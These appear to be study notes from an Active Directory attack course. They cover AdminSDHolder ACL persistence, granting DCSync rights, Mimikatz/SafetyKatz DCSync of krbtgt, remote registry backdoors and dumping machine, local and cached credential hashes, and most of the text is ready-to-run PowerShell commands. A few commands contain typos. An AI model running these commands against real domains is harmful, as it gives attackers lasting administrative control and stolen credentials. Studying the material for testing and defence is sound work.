changes made to ACLs on protected groups are periodically overwritten with SDProp (Security Descriptor Propagation)
- Account Operators
- Backup Operators
- Server Operators
- Print Operators
- Domain Admins
- Replicator

Well known abuse of some of the protected groups, all the following can log in locally to the DC
- Account Operators
	- cannot modify DA/EA/BA groups, can modify nested groups within these
- Backup Operators
	- backup GPO, edit to add SID of controlled account to a privileged group and restore
- Server Operators
	- run a command as system (using the disabled Browser service)
- Print Operators
	- copy ntds.dit backup, load device drivers

can modify the ACL of AdminSDHolder so that your user has full access over it and protected groups
![[assets/Pasted image 20260204073349.png]]
- this prevents the propagation from getting rid of your access


Modifying AdminSDHolder via PowerView as DA
`Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=<DOMAIN>,dc=<DOMAIN>,dc=<DOMAIN>' -PrincipalIdentity <user> -Rights All -PrincipalDomain <DOMAIN> -TargetDomain <DOMAIN> -Verbose`
- each iteration of domain is the placement between periods (i.e. dollarcorp.moneycorp.local -> CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local)
- user parameter is the user you want to have full access


Using ActiveDirectory Module and [RACE toolkit](https://github.com/samratashok/RACE)
`Set-DCPermissions -Method AdminSDHolder -SAMAccountName <user> -Right GenericAll -DistinguishedName 'CN=AdminSDHolder, CN=System,dc=<DOMAIN>,dc=<DOMAIN>' -Verbose`
- this one was a little different for the CN section (no CN=System)
	- if it doesn't work, try copying the one above
- with the RACE toolkit, you can add permissions


ResetPassword
`Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=<DOMAIN>,dc=<DOMAIN>,dc=<DOMAIN>' -PrincipalIdentity <user> -Rights ResetPassword -PrincipalDomain <DOMAIN> -TargetDomain <DOMAIN> -Verbose`


WriteMembers
`Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=<DOMAIN>,dc=<DOMAIN>,dc=<DOMAIN>' -PrincipalIdentity <user> -Rights WriteMembers -PrincipalDomain <DOMAIN> -TargetDomain <DOMAIN> -Verbose`


Abusing ResetPassword (resetting a password doesn't require knowledge of old one)
- PowerView
`Set-DomainUserPassword -Identity <user> -AccountPassword (ConvertTo-SecureString "<new_pass>" -AsPlainText -Force) -Verbose`
- ActiveDirectory Module
`Set-ADAccountPassword -Identity <user> -NewPassword (ConvertTo-SecureString "<new_pass>" -AsPlainText -Force) -Verbose`


Check Domain Admins permission (good for verification that it worked)
- PowerView
`Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "<user>}`
- ActiveDirectory Module
`(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=<DOMAIN>,DC=<DOMAIN>').Access | ?}_.IdentityReference -match '<user>'}`


Add FullControl rights (DCSync)
- need to add "Replicating Directory Changes" and "Replicating Directory Changes All"
- bad opsec - this will be logged
- PowerShell (or PowerView - he doesn't specify)
`Add-DomainObjectAcl -TargetIdentity 'DC=<DOMAIN>,DC=<DOMAIN>,DC=<DOMAIN>' -PrincipalIdentity <user> -Rights All -PrincipalDomain <DOMAIN> -TargetDomain <DOMAIN> -Verbose`
- ActiveDirectory Module and RACE
`Set-ADACL -SamAccountName <user> -DistinguishedName 'DC=<DOMAIN>,DC=<DOMAIN>' -Right GenericAll -Verbose`


Can execute DCSync with FullControl rights
- Mimikatz
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'`
- Safetykatz
`C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:<DOMAIN>\krbtgt" "exit"`



# Remote Registry

backdoor using RACE or DAMP, with admin privs on remote machine
`Add-RemoteRegBackdoor -ComputerName <hostname> -Trustee <user> -Verbose`


as a user, retrieve the machine account hash
`Get-RemoteMachineAccountHash -ComputerName <DOMAIN> -Verbose`
- can create a silver ticket -> if it's a DC, you can access any resources


retrieve the local administrator hash
`Get-RemoteLocalAccountHash -ComputerName <DOMAIN> -Verbose`


retrieve domain cached credentials
`Get-RemoteCachedCredential -ComputerName <DOMAIN> -Verbose`

